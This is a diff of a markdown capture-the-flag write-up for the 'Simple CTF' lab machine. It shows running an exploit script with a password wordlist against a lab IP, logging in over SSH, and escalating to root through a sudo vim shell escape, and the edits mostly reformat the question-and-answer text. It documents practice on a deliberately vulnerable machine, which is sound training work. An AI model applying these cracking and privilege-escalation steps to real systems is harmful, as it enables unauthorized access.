@@ -69,24 +69,15 @@ print ("[*] Now try to crack password")
 Now run it with `python2 46635.py -u http://10.67.153.113/simple/ --crack -w /usr/share/wordlists/rockyou.txt`
 **Output**:
 ![12.png](/assets/img/writeups/simple-ctf/12.png)
-**Q6**: Where can you login with the details obtained?
-You can log in via SSH, as we previously identified that the machine was running SSH.
-**Q7**: What's the user flag?
-Run this command to get the user flag
-`cat /home/mitch/user.txt `
-**Q8**: Is there any other user in the home directory? What's its name?
-Run this command to see other users
-`ls /home`
-**Q9**: What can you leverage to spawn a privileged shell?
-Run this command to find out what mitch can run `sudo -l`
-**Output**:
+**Q6**: Where can you login with the details obtained?<br>You can log in via SSH, as we previously identified that the machine was running SSH.<br>**Q7**: What's the user flag?
+<br>Run this command to get the user flag
+`cat /home/mitch/user.txt`.<br>**Q8**: Is there any other user in the home directory? What's its name?<br>Run this command to see other users `ls /home`.<br>**Q9**: What can you leverage to spawn a privileged shell?<br>Run this command to find out what mitch can run `sudo -l`.
 ````
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ````
 
-**Q10**: What's the root flag?
-We can run `vim` as sudo so run the command.
+**Q10**: >What's the root flag?<br>Use vim with sudo to get a root shell.
 `sudo vim` and type `:!bash` to spawn shell as root.
 ![13.png](/assets/img/writeups/simple-ctf/13.png)
 Finally run the command `cat /root/user.txt` to get the root flag.
